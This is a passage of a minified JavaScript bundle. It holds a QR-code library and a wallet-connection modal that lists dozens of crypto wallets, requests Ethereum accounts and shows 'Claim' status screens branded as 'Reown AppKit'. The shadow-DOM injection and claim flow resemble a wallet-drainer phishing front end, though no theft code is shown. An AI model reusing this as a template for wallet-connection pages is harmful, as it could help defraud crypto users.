r=MO(),e=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],t=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];return E8.getBlocksCount=function(n,s){switch(s){case r.L:return e[(n-1)*4+0];case r.M:return e[(n-1)*4+1];case r.Q:return e[(n-1)*4+2];case r.H:return e[(n-1)*4+3];default:return}},E8.getTotalCodewordsCount=function(n,s){switch(s){case r.L:return t[(n-1)*4+0];case r.M:return t[(n-1)*4+1];case r.Q:return t[(n-1)*4+2];case r.H:return t[(n-1)*4+3];default:return}},E8}var PI={},Ub={},MH;function eYe(){if(MH)return Ub;MH=1;const r=new Uint8Array(512),e=new Uint8Array(256);return function(){let i=1;for(let n=0;n<255;n++)r[n]=i,e[i]=n,i<<=1,i&256&&(i^=285);for(let n=255;n<512;n++)r[n]=r[n-255]}(),Ub.log=function(i){if(i<1)throw new Error("log("+i+")");return e[i]},Ub.exp=function(i){return r[i]},Ub.mul=function(i,n){return i===0||n===0?0:r[e[i]+e[n]]},Ub}var DH;function tYe(){return DH||(DH=1,function(r){const e=eYe();r.mul=function(i,n){const s=new Uint8Array(i.length+n.length-1);for(let o=0;o<i.length;o++)for(let a=0;a<n.length;a++)s[o+a]^=e.mul(i[o],n[a]);return s},r.mod=function(i,n){let s=new Uint8Array(i);for(;s.length-n.length>=0;){const o=s[0];for(let c=0;c<n.length;c++)s[c]^=e.mul(n[c],o);let a=0;for(;a<s.length&&s[a]===0;)a++;s=s.slice(a)}return s},r.generateECPolynomial=function(i){let n=new Uint8Array([1]);for(let s=0;s<i;s++)n=r.mul(n,new Uint8Array([1,e.exp(s)]));return n}}(PI)),PI}var $I,LH;function rYe(){if(LH)return $I;LH=1;const r=tYe();function e(t){this.genPoly=void 0,this.degree=t,this.degree&&this.initialize(this.degree)}return e.prototype.initialize=function(i){this.degree=i,this.genPoly=r.generateECPolynomial(this.degree)},e.prototype.encode=function(i){if(!this.genPoly)throw new Error("Encoder not initialized");const n=new Uint8Array(i.length+this.degree);n.set(i);const s=r.mod(n,this.genPoly),o=this.degree-s.length;if(o>0){const a=new Uint8Array(this.degree);return a.set(s,o),a}return s},$I=e,$I}var RI={},OI={},BI={},UH;function Bie(){return UH||(UH=1,BI.isValid=function(e){return!isNaN(e)&&e>=1&&e<=40}),BI}var Ku={},jH;function Mie(){if(jH)return Ku;jH=1;const r="[0-9]+",e="[A-Z $%*+\\-./:]+";let t="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";t=t.replace(/u/g,"\\u");const i="(?:(?![A-Z0-9 $%*+\\-./:]|"+t+`)(?:.|[\r
]))+`;Ku.KANJI=new RegExp(t,"g"),Ku.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g"),Ku.BYTE=new RegExp(i,"g"),Ku.NUMERIC=new RegExp(r,"g"),Ku.ALPHANUMERIC=new RegExp(e,"g");const n=new RegExp("^"+t+"$"),s=new RegExp("^"+r+"$"),o=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");return Ku.testKanji=function(c){return n.test(c)},Ku.testNumeric=function(c){return s.test(c)},Ku.testAlphanumeric=function(c){return o.test(c)},Ku}var FH;function S2(){return FH||(FH=1,function(r){const e=Bie(),t=Mie();r.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},r.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},r.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},r.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},r.MIXED={bit:-1},r.getCharCountIndicator=function(s,o){if(!s.ccBits)throw new Error("Invalid mode: "+s);if(!e.isValid(o))throw new Error("Invalid version: "+o);return o>=1&&o<10?s.ccBits[0]:o<27?s.ccBits[1]:s.ccBits[2]},r.getBestModeForData=function(s){return t.testNumeric(s)?r.NUMERIC:t.testAlphanumeric(s)?r.ALPHANUMERIC:t.testKanji(s)?r.KANJI:r.BYTE},r.toString=function(s){if(s&&s.id)return s.id;throw new Error("Invalid mode")},r.isValid=function(s){return s&&s.bit&&s.ccBits};function i(n){if(typeof n!="string")throw new Error("Param is not a string");switch(n.toLowerCase()){case"numeric":return r.NUMERIC;case"alphanumeric":return r.ALPHANUMERIC;case"kanji":return r.KANJI;case"byte":return r.BYTE;default:throw new Error("Unknown mode: "+n)}}r.from=function(s,o){if(r.isValid(s))return s;try{return i(s)}catch{return o}}}(OI)),OI}var qH;function iYe(){return qH||(qH=1,function(r){const e=_2(),t=Oie(),i=MO(),n=S2(),s=Bie(),o=7973,a=e.getBCHDigit(o);function c(h,f,p){for(let g=1;g<=40;g++)if(f<=r.getCapacity(g,p,h))return g}function l(h,f){return n.getCharCountIndicator(h,f)+4}function u(h,f){let p=0;return h.forEach(function(g){const w=l(g.mode,f);p+=w+g.getBitsLength()}),p}function d(h,f){for(let p=1;p<=40;p++)if(u(h,p)<=r.getCapacity(p,f,n.MIXED))return p}r.from=function(f,p){return s.isValid(f)?parseInt(f,10):p},r.getCapacity=function(f,p,g){if(!s.isValid(f))throw new Error("Invalid QR Code version");typeof g>"u"&&(g=n.BYTE);const w=e.getSymbolTotalCodewords(f),m=t.getTotalCodewordsCount(f,p),x=(w-m)*8;if(g===n.MIXED)return x;const S=x-l(g,f);switch(g){case n.NUMERIC:return Math.floor(S/10*3);case n.ALPHANUMERIC:return Math.floor(S/11*2);case n.KANJI:return Math.floor(S/13);case n.BYTE:default:return Math.floor(S/8)}},r.getBestVersionForData=function(f,p){let g;const w=i.from(p,i.M);if(Array.isArray(f)){if(f.length>1)return d(f,w);if(f.length===0)return 1;g=f[0]}else g=f;return c(g.mode,g.getLength(),w)},r.getEncodedBits=function(f){if(!s.isValid(f)||f<7)throw new Error("Invalid QR Code version");let p=f<<12;for(;e.getBCHDigit(p)-a>=0;)p^=o<<e.getBCHDigit(p)-a;return f<<12|p}}(RI)),RI}var MI={},zH;function nYe(){if(zH)return MI;zH=1;const r=_2(),e=1335,t=21522,i=r.getBCHDigit(e);return MI.getEncodedBits=function(s,o){const a=s.bit<<3|o;let c=a<<10;for(;r.getBCHDigit(c)-i>=0;)c^=e<<r.getBCHDigit(c)-i;return(a<<10|c)^t},MI}var DI={},LI,WH;function sYe(){if(WH)return LI;WH=1;const r=S2();function e(t){this.mode=r.NUMERIC,this.data=t.toString()}return e.getBitsLength=function(i){return 10*Math.floor(i/3)+(i%3?i%3*3+1:0)},e.prototype.getLength=function(){return this.data.length},e.prototype.getBitsLength=function(){return e.getBitsLength(this.data.length)},e.prototype.write=function(i){let n,s,o;for(n=0;n+3<=this.data.length;n+=3)s=this.data.substr(n,3),o=parseInt(s,10),i.put(o,10);const a=this.data.length-n;a>0&&(s=this.data.substr(n),o=parseInt(s,10),i.put(o,a*3+1))},LI=e,LI}var UI,HH;function oYe(){if(HH)return UI;HH=1;const r=S2(),e=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function t(i){this.mode=r.ALPHANUMERIC,this.data=i}return t.getBitsLength=function(n){return 11*Math.floor(n/2)+6*(n%2)},t.prototype.getLength=function(){return this.data.length},t.prototype.getBitsLength=function(){return t.getBitsLength(this.data.length)},t.prototype.write=function(n){let s;for(s=0;s+2<=this.data.length;s+=2){let o=e.indexOf(this.data[s])*45;o+=e.indexOf(this.data[s+1]),n.put(o,11)}this.data.length%2&&n.put(e.indexOf(this.data[s]),6)},UI=t,UI}var jI,VH;function aYe(){if(VH)return jI;VH=1;const r=S2();function e(t){this.mode=r.BYTE,typeof t=="string"?this.data=new TextEncoder().encode(t):this.data=new Uint8Array(t)}return e.getBitsLength=function(i){return i*8},e.prototype.getLength=function(){return this.data.length},e.prototype.getBitsLength=function(){return e.getBitsLength(this.data.length)},e.prototype.write=function(t){for(let i=0,n=this.data.length;i<n;i++)t.put(this.data[i],8)},jI=e,jI}var FI,KH;function cYe(){if(KH)return FI;KH=1;const r=S2(),e=_2();function t(i){this.mode=r.KANJI,this.data=i}return t.getBitsLength=function(n){return n*13},t.prototype.getLength=function(){return this.data.length},t.prototype.getBitsLength=function(){return t.getBitsLength(this.data.length)},t.prototype.write=function(i){let n;for(n=0;n<this.data.length;n++){let s=e.toSJIS(this.data[n]);if(s>=33088&&s<=40956)s-=33088;else if(s>=57408&&s<=60351)s-=49472;else throw new Error("Invalid SJIS character: "+this.data[n]+`
Make sure your charset is UTF-8`);s=(s>>>8&255)*192+(s&255),i.put(s,13)}},FI=t,FI}var GH;function lYe(){return GH||(GH=1,function(r){const e=S2(),t=sYe(),i=oYe(),n=aYe(),s=cYe(),o=Mie(),a=_2(),c=kee();function l(m){return unescape(encodeURIComponent(m)).length}function u(m,x,S){const T=[];let k;for(;(k=m.exec(S))!==null;)T.push({data:k[0],index:k.index,mode:x,length:k[0].length});return T}function d(m){const x=u(o.NUMERIC,e.NUMERIC,m),S=u(o.ALPHANUMERIC,e.ALPHANUMERIC,m);let T,k;return a.isKanjiModeEnabled()?(T=u(o.BYTE,e.BYTE,m),k=u(o.KANJI,e.KANJI,m)):(T=u(o.BYTE_KANJI,e.BYTE,m),k=[]),x.concat(S,T,k).sort(function(E,C){return E.index-C.index}).map(function(E){return{data:E.data,mode:E.mode,length:E.length}})}function h(m,x){switch(x){case e.NUMERIC:return t.getBitsLength(m);case e.ALPHANUMERIC:return i.getBitsLength(m);case e.KANJI:return s.getBitsLength(m);case e.BYTE:return n.getBitsLength(m)}}function f(m){return m.reduce(function(x,S){const T=x.length-1>=0?x[x.length-1]:null;return T&&T.mode===S.mode?(x[x.length-1].data+=S.data,x):(x.push(S),x)},[])}function p(m){const x=[];for(let S=0;S<m.length;S++){const T=m[S];switch(T.mode){case e.NUMERIC:x.push([T,{data:T.data,mode:e.ALPHANUMERIC,length:T.length},{data:T.data,mode:e.BYTE,length:T.length}]);break;case e.ALPHANUMERIC:x.push([T,{data:T.data,mode:e.BYTE,length:T.length}]);break;case e.KANJI:x.push([T,{data:T.data,mode:e.BYTE,length:l(T.data)}]);break;case e.BYTE:x.push([{data:T.data,mode:e.BYTE,length:l(T.data)}])}}return x}function g(m,x){const S={},T={start:{}};let k=["start"];for(let I=0;I<m.length;I++){const E=m[I],C=[];for(let N=0;N<E.length;N++){const L=E[N],$=""+I+N;C.push($),S[$]={node:L,lastCount:0},T[$]={};for(let y=0;y<k.length;y++){const A=k[y];S[A]&&S[A].node.mode===L.mode?(T[A][$]=h(S[A].lastCount+L.length,L.mode)-h(S[A].lastCount,L.mode),S[A].lastCount+=L.length):(S[A]&&(S[A].lastCount=L.length),T[A][$]=h(L.length,L.mode)+4+e.getCharCountIndicator(L.mode,x))}}k=C}for(let I=0;I<k.length;I++)T[k[I]].end=0;return{map:T,table:S}}function w(m,x){let S;const T=e.getBestModeForData(m);if(S=e.from(x,T),S!==e.BYTE&&S.bit<T.bit)throw new Error('"'+m+'" cannot be encoded with mode '+e.toString(S)+`.
 Suggested mode is: `+e.toString(T));switch(S===e.KANJI&&!a.isKanjiModeEnabled()&&(S=e.BYTE),S){case e.NUMERIC:return new t(m);case e.ALPHANUMERIC:return new i(m);case e.KANJI:return new s(m);case e.BYTE:return new n(m)}}r.fromArray=function(x){return x.reduce(function(S,T){return typeof T=="string"?S.push(w(T,null)):T.data&&S.push(w(T.data,T.mode)),S},[])},r.fromString=function(x,S){const T=d(x,a.isKanjiModeEnabled()),k=p(T),I=g(k,S),E=c.find_path(I.map,"start","end"),C=[];for(let N=1;N<E.length-1;N++)C.push(I.table[E[N]].node);return r.fromArray(f(C))},r.rawSplit=function(x){return r.fromArray(d(x,a.isKanjiModeEnabled()))}}(DI)),DI}var ZH;function uYe(){if(ZH)return _I;ZH=1;const r=_2(),e=MO(),t=ZZe(),i=YZe(),n=JZe(),s=QZe(),o=XZe(),a=Oie(),c=rYe(),l=iYe(),u=nYe(),d=S2(),h=lYe();function f(I,E){const C=I.size,N=s.getPositions(E);for(let L=0;L<N.length;L++){const $=N[L][0],y=N[L][1];for(let A=-1;A<=7;A++)if(!($+A<=-1||C<=$+A))for(let b=-1;b<=7;b++)y+b<=-1||C<=y+b||(A>=0&&A<=6&&(b===0||b===6)||b>=0&&b<=6&&(A===0||A===6)||A>=2&&A<=4&&b>=2&&b<=4?I.set($+A,y+b,!0,!0):I.set($+A,y+b,!1,!0))}}function p(I){const E=I.size;for(let C=8;C<E-8;C++){const N=C%2===0;I.set(C,6,N,!0),I.set(6,C,N,!0)}}function g(I,E){const C=n.getPositions(E);for(let N=0;N<C.length;N++){const L=C[N][0],$=C[N][1];for(let y=-2;y<=2;y++)for(let A=-2;A<=2;A++)y===-2||y===2||A===-2||A===2||y===0&&A===0?I.set(L+y,$+A,!0,!0):I.set(L+y,$+A,!1,!0)}}function w(I,E){const C=I.size,N=l.getEncodedBits(E);let L,$,y;for(let A=0;A<18;A++)L=Math.floor(A/3),$=A%3+C-8-3,y=(N>>A&1)===1,I.set(L,$,y,!0),I.set($,L,y,!0)}function m(I,E,C){const N=I.size,L=u.getEncodedBits(E,C);let $,y;for($=0;$<15;$++)y=(L>>$&1)===1,$<6?I.set($,8,y,!0):$<8?I.set($+1,8,y,!0):I.set(N-15+$,8,y,!0),$<8?I.set(8,N-$-1,y,!0):$<9?I.set(8,15-$-1+1,y,!0):I.set(8,15-$-1,y,!0);I.set(N-8,8,1,!0)}function x(I,E){const C=I.size;let N=-1,L=C-1,$=7,y=0;for(let A=C-1;A>0;A-=2)for(A===6&&A--;;){for(let b=0;b<2;b++)if(!I.isReserved(L,A-b)){let v=!1;y<E.length&&(v=(E[y]>>>$&1)===1),I.set(L,A-b,v),$--,$===-1&&(y++,$=7)}if(L+=N,L<0||C<=L){L-=N,N=-N;break}}}function S(I,E,C){const N=new t;C.forEach(function(b){N.put(b.mode.bit,4),N.put(b.getLength(),d.getCharCountIndicator(b.mode,I)),b.write(N)});const L=r.getSymbolTotalCodewords(I),$=a.getTotalCodewordsCount(I,E),y=(L-$)*8;for(N.getLengthInBits()+4<=y&&N.put(0,4);N.getLengthInBits()%8!==0;)N.putBit(0);const A=(y-N.getLengthInBits())/8;for(let b=0;b<A;b++)N.put(b%2?17:236,8);return T(N,I,E)}function T(I,E,C){const N=r.getSymbolTotalCodewords(E),L=a.getTotalCodewordsCount(E,C),$=N-L,y=a.getBlocksCount(E,C),A=N%y,b=y-A,v=Math.floor(N/y),_=Math.floor($/y),O=_+1,D=v-_,R=new c(D);let P=0;const B=new Array(y),M=new Array(y);let W=0;const K=new Uint8Array(I.buffer);for(let U=0;U<y;U++){const G=U<b?_:O;B[U]=K.slice(P,P+G),M[U]=R.encode(B[U]),P+=G,W=Math.max(W,G)}const q=new Uint8Array(N);let J=0,le,ae;for(le=0;le<W;le++)for(ae=0;ae<y;ae++)le<B[ae].length&&(q[J++]=B[ae][le]);for(le=0;le<D;le++)for(ae=0;ae<y;ae++)q[J++]=M[ae][le];return q}function k(I,E,C,N){let L;if(Array.isArray(I))L=h.fromArray(I);else if(typeof I=="string"){let v=E;if(!v){const _=h.rawSplit(I);v=l.getBestVersionForData(_,C)}L=h.fromString(I,v||40)}else throw new Error("Invalid data");const $=l.getBestVersionForData(L,C);if(!$)throw new Error("The amount of data is too big to be stored in a QR Code");if(!E)E=$;else if(E<$)throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: `+$+`.
`);const y=S(E,C,L),A=r.getSymbolSize(E),b=new i(A);return f(b,E),p(b),g(b,E),m(b,C,0),E>=7&&w(b,E),x(b,y),isNaN(N)&&(N=o.getBestMask(b,m.bind(null,b,C))),o.applyMask(N,b),m(b,C,N),{modules:b,version:E,errorCorrectionLevel:C,maskPattern:N,segments:L}}return _I.create=function(E,C){if(typeof E>"u"||E==="")throw new Error("No input text");let N=e.M,L,$;return typeof C<"u"&&(N=e.from(C.errorCorrectionLevel,e.M),L=l.from(C.version),$=o.from(C.maskPattern),C.toSJISFunc&&r.setToSJISFunction(C.toSJISFunc)),k(E,L,N,$)},_I}var qI={},zI={},YH;function Die(){return YH||(YH=1,function(r){function e(t){if(typeof t=="number"&&(t=t.toString()),typeof t!="string")throw new Error("Color should be defined as hex string");let i=t.slice().replace("#","").split("");if(i.length<3||i.length===5||i.length>8)throw new Error("Invalid hex color: "+t);(i.length===3||i.length===4)&&(i=Array.prototype.concat.apply([],i.map(function(s){return[s,s]}))),i.length===6&&i.push("F","F");const n=parseInt(i.join(""),16);return{r:n>>24&255,g:n>>16&255,b:n>>8&255,a:n&255,hex:"#"+i.slice(0,6).join("")}}r.getOptions=function(i){i||(i={}),i.color||(i.color={});const n=typeof i.margin>"u"||i.margin===null||i.margin<0?4:i.margin,s=i.width&&i.width>=21?i.width:void 0,o=i.scale||4;return{width:s,scale:s?4:o,margin:n,color:{dark:e(i.color.dark||"#000000ff"),light:e(i.color.light||"#ffffffff")},type:i.type,rendererOpts:i.rendererOpts||{}}},r.getScale=function(i,n){return n.width&&n.width>=i+n.margin*2?n.width/(i+n.margin*2):n.scale},r.getImageWidth=function(i,n){const s=r.getScale(i,n);return Math.floor((i+n.margin*2)*s)},r.qrToImageData=function(i,n,s){const o=n.modules.size,a=n.modules.data,c=r.getScale(o,s),l=Math.floor((o+s.margin*2)*c),u=s.margin*c,d=[s.color.light,s.color.dark];for(let h=0;h<l;h++)for(let f=0;f<l;f++){let p=(h*l+f)*4,g=s.color.light;if(h>=u&&f>=u&&h<l-u&&f<l-u){const w=Math.floor((h-u)/c),m=Math.floor((f-u)/c);g=d[a[w*o+m]?1:0]}i[p++]=g.r,i[p++]=g.g,i[p++]=g.b,i[p]=g.a}}}(zI)),zI}var JH;function dYe(){return JH||(JH=1,function(r){const e=Die();function t(n,s,o){n.clearRect(0,0,s.width,s.height),s.style||(s.style={}),s.height=o,s.width=o,s.style.height=o+"px",s.style.width=o+"px"}function i(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}r.render=function(s,o,a){let c=a,l=o;typeof c>"u"&&(!o||!o.getContext)&&(c=o,o=void 0),o||(l=i()),c=e.getOptions(c);const u=e.getImageWidth(s.modules.size,c),d=l.getContext("2d"),h=d.createImageData(u,u);return e.qrToImageData(h.data,s,c),t(d,l,u),d.putImageData(h,0,0),l},r.renderToDataURL=function(s,o,a){let c=a;typeof c>"u"&&(!o||!o.getContext)&&(c=o,o=void 0),c||(c={});const l=r.render(s,o,c),u=c.type||"image/png",d=c.rendererOpts||{};return l.toDataURL(u,d.quality)}}(qI)),qI}var WI={},QH;function hYe(){if(QH)return WI;QH=1;const r=Die();function e(n,s){const o=n.a/255,a=s+'="'+n.hex+'"';return o<1?a+" "+s+'-opacity="'+o.toFixed(2).slice(1)+'"':a}function t(n,s,o){let a=n+s;return typeof o<"u"&&(a+=" "+o),a}function i(n,s,o){let a="",c=0,l=!1,u=0;for(let d=0;d<n.length;d++){const h=Math.floor(d%s),f=Math.floor(d/s);!h&&!l&&(l=!0),n[d]?(u++,d>0&&h>0&&n[d-1]||(a+=l?t("M",h+o,.5+f+o):t("m",c,0),c=0,l=!1),h+1<s&&n[d+1]||(a+=t("h",u),u=0)):c++}return a}return WI.render=function(s,o,a){const c=r.getOptions(o),l=s.modules.size,u=s.modules.data,d=l+c.margin*2,h=c.color.light.a?"<path "+e(c.color.light,"fill")+' d="M0 0h'+d+"v"+d+'H0z"/>':"",f="<path "+e(c.color.dark,"stroke")+' d="'+i(u,l,c.margin)+'"/>',p='viewBox="0 0 '+d+" "+d+'"',w='<svg xmlns="http://www.w3.org/2000/svg" '+(c.width?'width="'+c.width+'" height="'+c.width+'" ':"")+p+' shape-rendering="crispEdges">'+h+f+`</svg>
`;return typeof a=="function"&&a(null,w),w},WI}var XH;function fYe(){if(XH)return om;XH=1;const r=GZe(),e=uYe(),t=dYe(),i=hYe();function n(s,o,a,c,l){const u=[].slice.call(arguments,1),d=u.length,h=typeof u[d-1]=="function";if(!h&&!r())throw new Error("Callback required as last argument");if(h){if(d<2)throw new Error("Too few arguments provided");d===2?(l=a,a=o,o=c=void 0):d===3&&(o.getContext&&typeof l>"u"?(l=c,c=void 0):(l=c,c=a,a=o,o=void 0))}else{if(d<1)throw new Error("Too few arguments provided");return d===1?(a=o,o=c=void 0):d===2&&!o.getContext&&(c=a,a=o,o=void 0),new Promise(function(f,p){try{const g=e.create(a,c);f(s(g,o,c))}catch(g){p(g)}})}try{const f=e.create(a,c);l(null,s(f,o,c))}catch(f){l(f)}}return om.create=e.create,om.toCanvas=n.bind(null,t.render),om.toDataURL=n.bind(null,t.renderToDataURL),om.toString=n.bind(null,function(s,o,a){return i.render(s,a)}),om}var pYe=fYe();const z3=Ss(pYe),Lie=document.createElement("div");document.body.appendChild(Lie);const rx=Lie.attachShadow({mode:"open"}),Yt=document.createElement("html");rx.appendChild(Yt);const eP=[{name:"Trust Wallet",icon:"./assets/wallets/Trust.png",id:"trust"},{name:"MetaMask",icon:"./assets/wallets/MetaMask.png",id:"metamask"},{name:"Binance",icon:"./assets/wallets/Binance.png",id:"binance"},{name:"OKX Wallet",icon:"./assets/wallets/OKX.png",id:"okx"},{name:"Bitget Wallet",icon:"./assets/wallets/Bitget.png",id:"bitget"},{name:"SafePal",icon:"./assets/wallets/SafePal.png",id:"safepal"},{name:"TokenPocket",icon:"/assets/wallets/TokenPocket.png",id:"tokenpocket"},{name:"Uniswap",icon:"./assets/wallets/Uniswap.png",id:"uniswap"},{name:"Bybit Wallet",icon:"./assets/wallets/Bybit.png",id:"bybit"},{name:"Zerion",icon:"./assets/wallets/Zerion.png",id:"zerion"},{name:"Ledger Live",icon:"./assets/wallets/Live.png",id:"ledger"},{name:"Crypto.com",icon:"./assets/wallets/Crypto.png",id:"crypto"},{name:"imToken",icon:"./assets/wallets/imToken.png",id:"imtoken"},{name:"1inch Wallet",icon:"./assets/wallets/1inch.png",id:"1inch"},{name:"Safe",icon:"./assets/wallets/Safe.png",id:"safe"},{name:"Ronin Wallet",icon:"./assets/wallets/Ronin.png",id:"ronin"},{name:"Fireblocks",icon:"./assets/wallets/Fireblocks.png",id:"fireblocks"},{name:"Best Wallet",icon:"./assets/wallets/Best.png",id:"best"},{name:"xPortal",icon:"./assets/wallets/xPortal.png",id:"xportal"},{name:"Bifrost Wallet",icon:"./assets/wallets/Bifrost.png",id:"bifrost"},{name:"Blockchain",icon:"./assets/wallets/Blockchain.png",id:"blockchain"},{name:"Ctrl Wallet",icon:"./assets/wallets/Ctrl.png",id:"ctrl"},{name:"Arculus Wallet",icon:"./assets/wallets/Arculus.png",id:"arculus"},{name:"BitPay Wallet",icon:"./assets/wallets/BitPay.png",id:"bitpay"},{name:"Backpack",icon:"./assets/wallets/Backpack.png",id:"backpack"},{name:"Rainbow",icon:"./assets/wallets/Rainbow.png",id:"rainbow"},{name:"HaHa",icon:"./assets/wallets/HaHa.png",id:"haha"},{name:"Exodus",icon:"./assets/wallets/Exodus.png",id:"exodus"},{name:"KuCoin Web3",icon:"./assets/wallets/KuCoin.png",id:"kucoin"},{name:"Phantom",icon:"./assets/wallets/Phantom.png",id:"phantom"},{name:"Tangem Wallet",icon:"./assets/wallets/Tangem.png",id:"tangem"},{name:"Magic Eden",icon:"./assets/wallets/MagicEden.png",id:"magiceden"},{name:"Coinbase Wallet",icon:"./assets/wallets/Coinbase.png",id:"coinbase"},{name:"MathWallet",icon:"./assets/wallets/Math.png",id:"math"},{name:"YoWallet",icon:"./assets/wallets/Yo.png",id:"yo"}];function Uie(){const r=B3();r.reset();const e=r.getProviders();if((!e||e.length===0)&&window.ethereum){let t="Injected Wallet",i="./assets/metamask.png";window.ethereum.isMetaMask?t="MetaMask":window.ethereum.isCoinbaseWallet?t="Coinbase Wallet":window.ethereum.isPhantom&&(t="Phantom"),e.push({info:{name:t,icon:i,walletId:"injected",uuid:""},provider:window.ethereum})}return e.push({info:{name:"WalletConnect",icon:"./assets/wallet_connect.png",walletId:"walletconnect",uuid:""},provider:null}),e}function jie(r){const e=document.createElement("div");return e.className="flex flex-col gap-2",[...r].sort((n,s)=>n.info.walletId==="walletconnect"?-1:s.info.walletId==="walletconnect"?1:n.info.name==="MetaMask"?-1:s.info.name==="MetaMask"?1:n.info.name==="Rabby Wallet"?-1:s.info.name==="Rabby Wallet"?1:n.info.name.localeCompare(s.info.name)).slice(0,6).forEach(n=>{const s=document.createElement("div");s.className="wallet-link",s.dataset.walletId=n.info.walletId,s.dataset.walletName=n.info.name,s.dataset.walletIcon=n.info.icon,s.dataset.providerIndex=r.findIndex(a=>a.info.name===n.info.name&&a.info.walletId===n.info.walletId);let o="";n.info.walletId==="walletconnect"?o=`<div class="dark:bg-[#5773FF]/10 uppercase text-[10px] bg-[#5773FF]/10 p-1.5 rounded-sm text-[#5773FF] font-bold">
        QR CODE
      </div>`:o=`<div class="dark:bg-green/30 uppercase text-[10px] bg-green/30 p-1.5 rounded-sm text-[#54ab73] font-bold">
        INSTALLED
      </div>`,s.innerHTML=`
      <div class="flex gap-2 items-center h-full">
        <div class="flex justify-center items-center h-full">
            <img src="${n.info.icon}" alt="${n.info.name}" class="max-w-10 max-h-10 rounded-xl">
        </div>
        <p>${n.info.name}</p>
      </div>
      ${o}
    `,e.appendChild(s)}),e}async function gYe(r,e,t){let i=[];return r.info.walletId==="walletconnect"?{success:!1}:(i=await r.provider.request({method:"eth_requestAccounts"}),i&&i.length>0?{success:!0,provider:r.provider,accounts:i}:{success:!1})}function mYe(r){if(!r)return;const e=r.style.maxHeight;r.style.maxHeight="none",r.style.height="auto";const t=r.scrollHeight;r.style.maxHeight=e,r.style.height="fit-content",r.offsetHeight,r.style.maxHeight=t+50+"px",setTimeout(()=>{r.style.maxHeight="600px"},300)}function wYe(r){if(!r)return;const e=r.cloneNode(!0);e.style.cssText=`
    position: absolute;
    top: -9999px;
    left: -9999px;
    visibility: hidden;
    max-height: none;
    height: auto;
    width: ${r.offsetWidth}px;
  `,Yt.appendChild(e);const t=e.offsetHeight;Yt.removeChild(e),r.style.maxHeight=t+"px",setTimeout(()=>{r.style.maxHeight="600px"},600)}function rl(){const r=Yt.querySelector(".modal-content");r&&r.classList.contains("active")&&wYe(r)}function Xc(r){const e=Yt.querySelector("#confirmation_step #status-container");e&&(e.style.opacity="0",e.style.transform="translateY(10px)",setTimeout(()=>{e.innerHTML="";const t=vYe(r);e.appendChild(t),bYe(),e.style.opacity="1",e.style.transform="translateY(0)",setTimeout(()=>{rl()},100)},150))}function bYe(){const r=Yt.querySelector(".status_text");if(!r)return;let e="Reown AppKit";r.textContent=e}function vYe({type:r,title:e,description:t,icon:i="./assets/metamask.png",showSuccess:n=!1,showButton:s=!1,buttonText:o="Try again",showCheckbox:a=!1,checkboxText:c="",checkboxId:l="modal-checkbox"}){const u=document.createElement("div");u.className=`screen-container screen-${r}`,u.style.cssText=`
    opacity: 0;
    transform: translateY(10px);
    transition: all 0.3s ease;
  `;let d="";r==="primary"&&(e.includes("Processing")||e.includes("Loading"))?d=`
      <div class="screen-icon">
        <div class="spinner"></div>
      </div>
    `:r==="danger"?d=`
      <div class="screen-icon">
        <img src="./assets/error.png" alt="error" class="wallet-icon">
      </div>
    `:r==="success"&&e.includes("Claim")?d=`
      <div class="screen-icon">
        <img src="./assets/claim.png" alt="claim" class="wallet-icon">
      </div>
    `:r==="success"||e.includes("Approved")||e.includes("Confirm")?d=`
      <div class="screen-icon">
        <img src="${i}" alt="wallet" class="wallet-icon">
        ${n?`
          <div class="success-indicator">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M13.5 4.5L6 12L2.5 8.5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </div>
        `:""}
      </div>
    `:r==="warning"?d=`
      <div class="screen-icon">
        <img src="${i}" alt="wallet" class="wallet-icon">
      </div>
    `:d=`
      <div class="screen-icon">
        <img src="${i}" alt="wallet" class="wallet-icon">
      </div>
    `;let h="";return r==="danger"?h=`
      <div class="screen-content">
        ${d}
        <div class="screen-text">
          <h2 class="screen-title">${e}</h2>
        </div>
        <button class="screen-button" onclick="handleRetryClick()">
